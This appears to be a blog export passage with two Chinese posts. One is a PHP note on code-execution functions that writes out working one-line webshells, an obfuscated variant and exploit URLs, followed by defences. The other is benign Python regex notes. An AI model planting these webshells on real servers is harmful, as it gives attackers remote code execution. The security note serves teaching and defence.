class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>利用方式：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> shell.php?cmd=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#文件上传条件竞争可利用此方式来创建文件</span></span><br><span class=\"line\"><span class=\"number\">2.</span> shell.php?cmd=fputs(fopen(<span class=\"string\">'test.php'</span>,<span class=\"string\">'w'</span>),<span class=\"string\">'&lt;?php @eval($_POST[test])?&gt;'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#绕过</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = @(string)$_GET[<span class=\"string\">\"cmd\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">'$cmd=\"'</span> . addslashes($cmd) . <span class=\"string\">'\";'</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">3.</span> shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#绕过</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$cmd = <span class=\"string\">\"echo \\\"hello \"</span> . $_GET[<span class=\"string\">'cmd'</span>] . <span class=\"string\">\"\\\";\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>($cmd);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">4.</span> $&#123;$&#123;&#125;&#125;</span><br><span class=\"line\">shell.php?cmd=$&#123;$&#123;phpinfo()&#125;&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"assert\"><a href=\"#assert\" class=\"headerlink\" title=\"assert()\"></a>assert()</h3><p>— bool assert ( <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] )</p>\n<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@assert($_GET[<span class=\"string\">\"cmd\"</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"preg-replace-‘-e’\"><a href=\"#preg-replace-‘-e’\" class=\"headerlink\" title=\"preg_replace + ‘/e’\"></a>preg_replace + ‘/e’</h3><p>preg_replace — 执行一个正则表达式的搜索和替换</p>\n<p>preg_replace ( $pattern , $replacement , $subject )</p>\n<p>preg_replace(1,2,3),在3中用1的格式匹配，用2的格式输出。</p>\n<p>代码执行条件：</p>\n<ol>\n<li><p>magic_quotes_gpc=Off时，导致代码执行。</p>\n</li>\n<li><p>pattern参数中注入/e选项</p>\n</li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$regexp = $_GET[<span class=\"string\">'reg'</span>];</span><br><span class=\"line\">$var = <span class=\"string\">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/&lt;php&gt;(.*?)$regexp\"</span>, <span class=\"string\">'\\\\1'</span>, $var);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#利用方式 reg=%3C\\/php%3E/e 即reg=&lt;\\/php&gt;/e</span></span><br></pre></td></tr></table></figure>\n\n<p>利用方式：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#当replacement 参数构成一个合理的php 代码字符串的时候</span></span><br><span class=\"line\"><span class=\"comment\">#/e 修正符使preg_replace()，将replacement 参数当做php 代码执行</span></span><br><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"number\">1.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"//e\"</span>, $_GET[<span class=\"string\">'cmd'</span>], <span class=\"string\">\"cmd test\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">shell.php?cmd=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\">preg_replace(<span class=\"string\">\"/\\s*\\[php\\](.+?)\\[\\/php\\]\\s*/ies\"</span>, <span class=\"string\">\"\\\\1\"</span>, $_GET[<span class=\"string\">'h'</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">h=[php]phpinfo()[/php]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/php/php_fun_CodeAndOrder/001.png\" alt=\"001\"></p>\n<p>php5.5以后用’’’preg_replace_callback’’’代替’’’preg_replace’’’的/e模式来处理正则执行替换</p>\n<h3 id=\"array-map\"><a href=\"#array-map\" class=\"headerlink\" title=\"array_map\"></a>array_map</h3><p>array_map — 为数组的每个元素应用回调函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> array_map(<span class=\"string\">\"ass\\x65rt\"</span>,(<span class=\"keyword\">array</span>)$_REQUEST[<span class=\"string\">'test'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?test=phpinfo()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call-user-func\"><a href=\"#call-user-func\" class=\"headerlink\" title=\"call_user_func\"></a>call_user_func</h3><p>call_user_func ( <a href=\"http://php.net/manual/zh/language.types.callable.php\" target=\"_blank\" rel=\"noopener\">callable</a> <code>$callback</code> [, <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$parameter</code> [, <a href=\"http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed\" target=\"_blank\" rel=\"noopener\">mixed</a> <code>$...</code> ]] )</p>\n<p>call_user_func — 把第一个参数作为回调函数调用</p>\n<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> call_user_func(<span class=\"string\">'assert'</span>, $_REQUEST[<span class=\"string\">'pass'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call-user-func-array\"><a href=\"#call-user-func-array\" class=\"headerlink\" title=\"call_user_func_array\"></a>call_user_func_array</h3><p>call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数</p>\n<p>把第一个参数作为回调函数（<code>callback</code>）调用，把参数数组作（<code>param_arr</code>）为回调函数的的参数传入。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#call_user_func_array与call_user_func类似，只是第二个参数可以传入参数列表组成的数组</span></span><br><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> call_user_func_array(<span class=\"string\">'assert'</span>, <span class=\"keyword\">array</span>($_REQUEST[<span class=\"string\">'pass'</span>]));<span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function - 创建一个匿名（lambda样式）函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#例:一句话木马</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> preg_replace_callback(<span class=\"string\">'/.+/i'</span>, create_function(<span class=\"string\">'$arr'</span>, <span class=\"string\">'return assert($arr[0]);'</span>),$_REQUEST[<span class=\"string\">'pass'</span>]);<span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1.</span>shell.php?pass=phpinfo();</span><br></pre></td></tr></table></figure>\n\n<p>php中其他包含回调函数参数的函数也有潜力</p>\n<h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><h3 id=\"system\"><a href=\"#system\" class=\"headerlink\" title=\"system\"></a>system</h3><p>string system ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>\n<p>$command:要执行的命令。</p>\n<h3 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h3><p>string exec ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>\n<p><strong>exec()</strong> 执行 <code>command</code> 参数所指定的命令。</p>\n<h3 id=\"shell-exec\"><a href=\"#shell-exec\" class=\"headerlink\" title=\"shell_exec\"></a>shell_exec</h3><p>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>\n<h3 id=\"passthru\"><a href=\"#passthru\" class=\"headerlink\" title=\"passthru\"></a>passthru</h3><p>直接将结果输出到游览器,不返回任何值</p>\n<h3 id=\"popen\"><a href=\"#popen\" class=\"headerlink\" title=\"popen\"></a>popen</h3><p>resource popen ( string <code>$command</code> , string <code>$mode</code> )</p>\n<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p>\n<h3 id=\"proc-open\"><a href=\"#proc-open\" class=\"headerlink\" title=\"proc_open\"></a>proc_open</h3><p>类似 <a href=\"http://php.net/manual/zh/function.popen.php\" target=\"_blank\" rel=\"noopener\">popen()</a> 函数.但提供了更加强大的控制程序执行的能力。</p>\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><ol>\n<li><p>尽量不要执行外部命令</p>\n</li>\n<li><p>使用自定义函数或函数库来替代外部命令的功能</p>\n</li>\n<li><p>使用escapeshellarg函数来处理命令参数</p>\n</li>\n<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>\n</li>\n</ol>\n<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\\’”，双引号“””，替换成“&quot;”，分号“;”替换成“;”</p>\n<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内</p>\n<p>safe_mode = On</p>\n<p>safe_mode_exec_dir = /usr/local/php/bin/</p>\n"},{"title":"python-正则笔记","date":"2018-12-04T09:01:52.000Z","_content":"\n# python-正则笔记\n\n## 0x00 命名分组\n\n### 命名分组捕获\n\n``` python\nimport re\nname = r'(?P<year>\\d{4})-(?P<month>\\d{2})-(?P<day>\\d{2})'\nr = re.search(name, \"2018-09-12\")\nprint r.group('year')\nprint r.group('month')\nprint r.group('day')\nprint r.group(1)\nprint r.group(2)\nprint r.group(3)\n```\n\n从上看出仍然可以用数字编号来引用分组。\n\n![001](/img/python/Reg/001.png)\n\n值得注意的是，需要反向引用时必须用`（？P=name）`,在正则表达式中进行替换需要写做`\\g<name>`\n\n![002](/img/python/Reg/002.png)\n\n### 非捕获分组\n\n非捕获分组不会保存匹配文本，能提高正则提高效率。\n\n用法：`（？：...）`\n\n示例：\n\n``` python\nprint re.search(r'(\\d{4})-(\\d{2})-(\\d{2})','2018-12-22').group(1)\nprint re.search(r'(?:\\d{4})-(\\d{2})-(\\d{2})','2018-12-22').group(1)\n```\n\n![003](/img/python/Reg/003.png)\n\n\n\n## 0x01 断言\n\n断言用来判断某个位置的文本是否符合要求。\n\n常见断言: 单词边界、行起始/结束位置、环视\n\n### 单词边界\n\n `\\b`是为了区分单词还是字符串而使用的\n\n| 字符串 | \\brow\\b | \\brow | row\\b |\n| :--: | :--: | :--: | :-: |\n| tomorrow |  |      |√|\n| brown |      |      ||\n| row | √ | √ |√|\n| rowby | | √ ||\n| 表达式说明 | 只能是单词 | \\b右侧是单词，左侧不能有字符 |\\b左侧是单词，右侧不能有字符|\n\n\n\n### 行起始/结束位置\n\n#### 行终止符\n\n|    平台    | 行终止符 |\n| :--------: | :------: |\n| UNIX/Linux |    \\n    |\n|  Windows   |   \\r\\n   |\n\n利用多行模式匹配多行字符串：在正则前加上`(?m)`\n\n```python\n#提取每行的第一个单词\nimport re\nstr = 'first line\\nsecond line\\r\\n\\rlast line'\nprint re.findall(r'(?m)^\\w+',str)\n```\n\n![004](/img/python/Reg/004.png)\n\n其中第三行因`\\r`没有匹配上。\n\n```python\n#提取整段文本的第一个单词\nimport re\nstr = 'first line\\nsecond line\\r\\nlast line'\nprint re.findall(r'(?m)\\A\\w+',str)\n```\n\n![005](/img/python/Reg/005.png)\n\n### 锚点$\n\n#### 特性\n\n`$`会判断行终止符是否存在，智能匹配行结束位置前的字符串\n\n```python\n#提取整段文本的最后一个单词\nimport re\nstr = 'Some sample test'\nprint re.findall(r'\\w+$',str)\nstr = 'Some sample test\\n'\nprint re.findall(r'\\w+$',str)\n```\n\n结果是一样的。\n\n![006](/img/python/Reg/006.png)\n\n\n\n```python\n#利用多行模式匹配每行最后一个单词\nimport re\nstr = 'first line1\\nsecond line2\\r\\nlast line3'\nprint re.findall(r'(?m)\\w+$',str)\n```\n\n![007](/img/python/Reg/007.png)\n\n####  利用\\A和\\Z完成更准确的数据验证\n\n由于`$`还能匹配行终止符,Apache HTTPD 换行解析漏洞（CVE-2017-15715）就是由于这个原因产生。有时就需要更准确的匹配。\n\n```python\nre.search(r'^\\d{6}$','123456') !=None\nre.search(r'^\\d{6}$','123456\\n') !=None\n#python不支持\\z,python的\\Z等价于其他语言的\\z\nre.search(r'\\A\\d{6}\\Z','123456') !=None\nre.search(r'\\A\\d{6}\\Z','123456\\n') !=None\n```\n\n![008](/img/python/Reg/008.png)\n\n### 替换时不会被替代\n\n看下面用例,可以处理文本格式。\n\n#### 替换\n\n```python\nimport re\nstr = \"line1\\nline2\\nline3\"\nprint str\nprint re.sub(r'(?m)$','</p>',re.sub(r'(?m)^','<p>',str))\n```\n\n![009](/img/python/Reg/009.png)\n\n#### 处理行首尾空白字符\n\n```python\nimport re\nstr = \"  begin\\n between\\t\\n\\nend \"\nprint str\nprint re.sub(r'(?m)^\\s+','',re.sub(r'(?m)\\s+$','',str))\n```\n\n![010](/img/python/Reg/010.png)\n\n### 环视\n\n这部分概念有些多，但是结合实际例子还是很好理解的。\n\n#### 环视分类\n\n|     名字     |    记法    | 判断方向 |\n| :----------: | :--------: | :------: |\n| 肯定顺序环视 | （?=...）  |   向右   |\n| 否定顺序环视 | （?!...）  |   向右   |\n| 肯定逆序环视 | （?<=...） |   向左   |\n| 否定逆序环视 | （?<!...） |   向左   |\n\n总结一下：\n\n1. 向右看就叫顺序，向左就叫逆序，这和现代人的阅读方向是一致的。\n\n2. 肯定是要匹配的字符串，否定是排除的字符串\n\n3. 肯定：`=`，否定：`！`，顺序：`没有<` ，逆序：`<`\n\n\n\n#### 例1\n\n将，添加到右侧字符串是3的倍数处。即12345，变成12,345\n\n\n   ```python\nimport re\nprint re.sub(r'(?=\\d{3})',',','12345')\n   ```\n\n![011](/img/python/Reg/011.png)\n\n产生这个原因是环视的特性：原地执行。可以把`12345`看成` 01020304050`，（0表示位置，不是表示数字。）现在我处在第一个0的位置，右边存在3个数字，满足正则，因此将第一处`0`替换为`，`，在下一个0位置同理。\n\n改进\n\n```python\n \timport re\n \t#利用+(?!\\d)匹配到字符串尾\n \tprint re.sub(r'(?=(\\d{3})+(?!\\d))',',','123456789')\n \t#改进3的倍数时首部插入，\n    print re.sub(r'(?<=\\d)(?=(\\d{3})+(?!\\d))',',','123456789')\n```\n\n![012](/img/python/Reg/012.png)\n\n#### 例2\n\n去除中英文混排\n\n```python\nimport re\nstr = '中 英文混排, some English word, 有多余的空 白字符'\nprint re.sub(r'(?<![a-zA-Z])\\s+(?![a-zA-Z])','',str)\n```\n\n![013](/img/python/Reg/013.png)\n\n\n\n#### 环视结构不影响引用分组\n\n```python\nimport re\nprint re.search(r'(?!=ab)(cd)','abcd').group(0)\nprint re.search(r'(?!=ab)(cd)','abcd').group(1)\n```\n\n\n\n![014](/img/python/Reg/014.png)\n\n环视的用法还很多，这里不能一一列举了。\n\n## 匹配模式\n\n### 模式修饰符\n\npython中用`（？i）`来实现不去区分大小写模式\n\n```python\nimport re\nre.search(r'(?i)the','The') != None\nre.search(r'(?i)the','the') != None\nre.search(r'(?i)the','THE') != None\n```\n\n### 预订义常量\n\npython：re.I （预定义常量在不同语言中写法不同）\n\n```python\nimport re\nre.search(r'the','The',re.I) != None\nre.search(r'the','the',re.I) != None\nre.search(r'the','THE',re.I) != None\n```\n\n![016](/img/python/Reg/016.png)\n\n### 常见匹配模式表格（python）\n\n|    模式    | 模式修饰符用法 |     预定义常量     |                          备注                           |\n| :--------: | :------------: | :----------------: | :-----------------------------------------------------: |\n|  单行模式  |      (?s)      |  re.S和re.DOTALL   | s（Single line) ，单行模式解决的是.不能代表换行符的问题 |\n|  多行模式  |     （?m）     | re.M和re.MULTILINE |              使^和$能匹配每行的行首和行尾               |\n| 不分大小写 |     （?i）     |        re.I        |                                                         |\n|  注释模式  |     （?x）     |  re.X和re.VERBOSE  |                   comment是注释的内容                   |\n多行模式:\n\n```python\nimport re\nmstr = '1 line\\nNot digit\\n2 line'\nfor line in re.findall(r'(?m)^\\d.*',mstr):\n    print line\n```\n\n![017](/img/python/Reg/017.png)\n\n### 作用范围\n\n|   正则    |    匹配文本     |\n| :-------: | :-------------: |\n|  t(?i)ht  | tHE the thE tHe |\n|  th(?i)e  |     thE the     |\n| t((?i)h)e |     tHe the     |\n| t(?i:h)e  |     tHe the     |\n\n总结：\n\n1. 放在开头全局起作用\n2. 放在中间对后部分起作用\n3. 在括号内仅对括号范围起作用\n\n\n\n\n\n","source":"_posts/python-正则笔记.md","raw":"---\ntitle: python-正则笔记\ndate: 2018-12-04 17:01:52\ntags: 正则\ncategories: python\n---\n\n# python-正则笔记\n\n## 0x00 命名分组\n\n### 命名分组捕获\n\n``` python\nimport re\nname = r'(?P<year>\\d{4})-(?P<month>\\d{2})-(?P<day>\\d{2})'\nr = re.search(name, \"2018-09-12\")\nprint r.group('year')\nprint r.group('month')\nprint r.group('day')\nprint r.group(1)\nprint r.group(2)\nprint r.group(3)\n```\n\n从上看出仍然可以用数字编号来引用分组。\n\n![001](/img/python/Reg/001.png)\n\n值得注意的是，需要反向引用时必须用`（？P=name）`,在正则表达式中进行替换需要写做`\\g<name>`\n\n![002](/img/python/Reg/002.png)\n\n### 非捕获分组\n\n非捕获分组不会保存匹配文本，能提高正则提高效率。\n\n用法：`（？：...）`\n\n示例：\n\n``` python\nprint re.search(r'(\\d{4})-(\\d{2})-(\\d{2})','2018-12-22').group(1)\nprint re.search(r'(?:\\d{4})-(\\d{2})-(\\d{2})','2018-12-22').group(1)\n```\n\n![003](/img/python/Reg/003.png)\n\n\n\n## 0x01 断言\n\n断言用来判断某个位置的文本是否符合要求。\n\n常见断言: 单词边界、行起始/结束位置、环视\n\n### 单词边界\n\n `\\b`是为了区分单词还是字符串而使用的\n\n| 字符串 | \\brow\\b | \\brow | row\\b |\n| :--: | :--: | :--: | :-: |\n| tomorrow |  |      |√|\n| brown |      |      ||\n| row | √ | √ |√|\n| rowby | | √ ||\n| 表达式说明 | 只能是单词 | \\b右侧是单词，左侧不能有字符 |\\b左侧是单词，右侧不能有字符|\n\n\n\n### 行起始/结束位置\n\n#### 行终止符\n\n|    平台    | 行终止符 |\n| :--------: | :------: |\n| UNIX/Linux |    \\n    |\n|  Windows   |   \\r\\n   |\n\n利用多行模式匹配多行字符串：在正则前加上`(?m)`\n\n```python\n#提取每行的第一个单词\nimport re\nstr = 'first line\\nsecond line\\r\\n\\rlast line'\nprint re.findall(r'(?m)^\\w+',str)\n```\n\n![004](/img/python/Reg/004.png)\n\n其中第三行因`\\r`没有匹配上。\n\n```python\n#提取整段文本的第一个单词\nimport re\nstr = 'first line\\nsecond line\\r\\nlast line'\nprint re.findall(r'(?m)\\A\\w+',str)\n```\n\n![005](/img/python/Reg/005.png)\n\n### 锚点$\n\n#### 特性\n\n`$`会判断行终止符是否存在，智能匹配行结束位置前的字符串\n\n```python\n#提取整段文本的最后一个单词\nimport re\nstr = 'Some sample test'\nprint re.findall(r'\\w+$',str)\nstr = 'Some sample test\\n'\nprint re.findall(r'\\w+$',str)\n```\n\n结果是一样的。\n\n![006](/img/python/Reg/006.png)\n\n\n\n```python\n#利用多行模式匹配每行最后一个单词\nimport re\nstr = 'first line1\\nsecond line2\\r\\nlast line3'\nprint re.findall(r'(?m)\\w+$',str)\n```\n\n![007](/img/python/Reg/007.png)\n\n####  利用\\A和\\Z完成更准确的数据验证\n\n由于`$`还能匹配行终止符,Apache HTTPD 换行解析漏洞（CVE-2017-15715）就是由于这个原因产生。有时就需要更准确的匹配。\n\n```python\nre.search(r'^\\d{6}$','123456') !=None\nre.search(r'^\\d{6}$','123456\\n') !=None\n#python不支持\\z,python的\\Z等价于其他语言的\\z\nre.search(r'\\A\\d{6}\\Z','123456') !=None\nre.search(r'\\A\\d{6}\\Z','123456\\n') !=None\n```\n\n![008](/img/python/Reg/008.png)\n\n### 替换时不会被替代\n\n看下面用例,可以处理文本格式。\n\n#### 替换\n\n```python\nimport re\nstr = \"line1\\nline2\\nline3\"\nprint str\nprint re.sub(r'(?m)$','</p>',re.sub(r'(?m)^','<p>',str))\n```\n\n![009](/img/python/Reg/009.png)\n\n#### 处理行首尾空白字符\n\n```python\nimport re\nstr = \"  begin\\n between\\t\\n\\nend \"\nprint str\nprint re.sub(r'(?m)^\\s+','',re.sub(r'(?m)\\s+$','',str))\n```\n\n![010](/img/python/Reg/010.png)\n\n### 环视\n\n这部分概念有些多，但是结合实际例子还是很好理解的。\n\n#### 环视分类\n\n|     名字     |    记法    | 判断方向 |\n| :----------: | :--------: | :------: |\n| 肯定顺序环视 | （?=...）  |   向右   |\n| 否定顺序环视 | （?!...）  |   向右   |\n| 肯定逆序环视 | （?<=...） |   向左   |\n| 否定逆序环视 | （?<!...） |   向左   |\n\n总结一下：\n\n1. 向右看就叫顺序，向左就叫逆序，这和现代人的阅读方向是一致的。\n\n2. 肯定是要匹配的字符串，否定是排除的字符串\n\n3. 肯定：`=`，否定：`！`，顺序：`没有<` ，逆序：`<`\n\n\n\n#### 例1\n\n将，添加到右侧字符串是3的倍数处。即12345，变成12,345\n\n\n   ```python\nimport re\nprint re.sub(r'(?=\\d{3})',',','12345')\n   ```\n\n![011](/img/python/Reg/011.png)\n\n产生这个原因是环视的特性：原地执行。可以把`12345`看成` 01020304050`，（0表示位置，不是表示数字。）现在我处在第一个0的位置，右边存在3个数字，满足正则，因此将第一处`0`替换为`，`，在下一个0位置同理。\n\n改进\n\n```python\n \timport re\n \t#利用+(?!\\d)匹配到字符串尾\n \tprint re.sub(r'(?=(\\d{3})+(?!\\d))',',','123456789')\n \t#改进3的倍数时首部插入，\n    print re.sub(r'(?<=\\d)(?=(\\d{3})+(?!\\d))',',','123456789')\n```\n\n![012](/img/python/Reg/012.png)\n\n#### 例2\n\n去除中英文混排\n\n```python\nimport re\nstr = '中 英文混排, some English word, 有多余的空 白字符'\nprint re.sub(r'(?<![a-zA-Z])\\s+(?![a-zA-Z])','',str)\n```\n\n![013](/img/python/Reg/013.png)\n\n\n\n#### 环视结构不影响引用分组\n\n```python\nimport re\nprint re.search(r'(?!=ab)(cd)','abcd').group(0)\nprint re.search(r'(?!=ab)(cd)','abcd').group(1)\n```\n\n\n\n![014](/img/python/Reg/014.png)\n\n环视的用法还很多，这里不能一一列举了。\n\n## 匹配模式\n\n### 模式修饰符\n\npython中用`（？i）`来实现不去区分大小写模式\n\n```python\nimport re\nre.search(r'(?i)the','The') != None\nre.search(r'(?i)the','the') != None\nre.search(r'(?i)the','THE') != None\n```\n\n### 预订义常量\n\npython：re.I （预定义常量在不同语言中写法不同）\n\n```python\nimport re\nre.search(r'the','The',re.I) != None\nre.search(r'the','the',re.I) != None\nre.search(r'the','THE',re.I) != None\n```\n\n![016](/img/python/Reg/016.png)\n\n### 常见匹配模式表格（python）\n\n|    模式    | 模式修饰符用法 |     预定义常量     |                          备注                           |\n| :--------: | :------------: | :----------------: | :-----------------------------------------------------: |\n|  单行模式  |      (?s)      |  re.S和re.DOTALL   | s（Single line) ，单行模式解决的是.不能代表换行符的问题 |\n|  多行模式  |     （?m）     | re.M和re.MULTILINE |              使^和$能匹配每行的行首和行尾               |\n| 不分大小写 |     （?i）     |        re.I        |                                                         |\n|  注释模式  |     （?x）     |  re.X和re.VERBOSE  |                   comment是注释的内容                   |\n多行模式:\n\n```python\nimport re\nmstr = '1 line\\nNot digit\\n2 line'\nfor line in re.findall(r'(?m)^\\d.*',mstr):\n    print line\n```\n\n![017](/img/python/Reg/017.png)\n\n### 作用范围\n\n|   正则    |    匹配文本     |\n| :-------: | :-------------: |\n|  t(?i)ht  | tHE the thE tHe |\n|  th(?i)e  |     thE the     |\n| t((?i)h)e |     tHe the     |\n| t(?i:h)e  |     tHe the     |\n\n总结：\n\n1. 放在开头全局起作用\n2. 放在中间对后部分起作用\n3. 在括号内仅对括号范围起作用\n\n\n\n\n\n","slug":"python-正则笔记","published":1,"updated":"2019-06-19T17:23:13.384Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istcc001d4dsb5wqn5b2z","content":"<h1 id=\"python-正则笔记\"><a href=\"#python-正则笔记\" class=\"headerlink\" title=\"python-正则笔记\"></a>python-正则笔记</h1><h2 id=\"0x00-命名分组\"><a href=\"#0x00-命名分组\" class=\"headerlink\" title=\"0x00 命名分组\"></a>0x00 命名分组</h2><h3 id=\"命名分组捕获\"><a href=\"#命名分组捕获\" class=\"headerlink\" title=\"命名分组捕获\"></a>命名分组捕获</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\">name = <span class=\"string\">r'(?P&lt;year&gt;\\d&#123;4&#125;)-(?P&lt;month&gt;\\d&#123;2&#125;)-(?P&lt;day&gt;\\d&#123;2&#125;)'</span></span><br><span class=\"line\">r = re.search(name, <span class=\"string\">\"2018-09-12\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"string\">'year'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span class=\"string\">'month'</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> r.group(<span 